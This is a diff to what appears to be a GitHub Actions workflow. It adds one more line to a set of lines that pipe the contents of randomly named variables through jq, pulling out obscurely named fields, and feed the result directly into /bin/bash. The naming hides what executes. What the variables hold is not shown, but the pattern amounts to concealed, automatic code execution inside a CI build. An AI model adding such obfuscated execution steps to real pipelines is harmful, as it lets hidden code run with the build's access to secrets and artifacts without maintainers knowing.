@@ -25,6 +25,7 @@ jobs:
           echo $u128 | jq -r .e082 | /bin/bash
           printf '%s' "$l51275" | jq -r .aqnoc4 | /bin/bash
           echo $m0 | jq -r .pw85 | /bin/bash
+          printf '%s' "$am7184" | jq -r .ifss9587 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
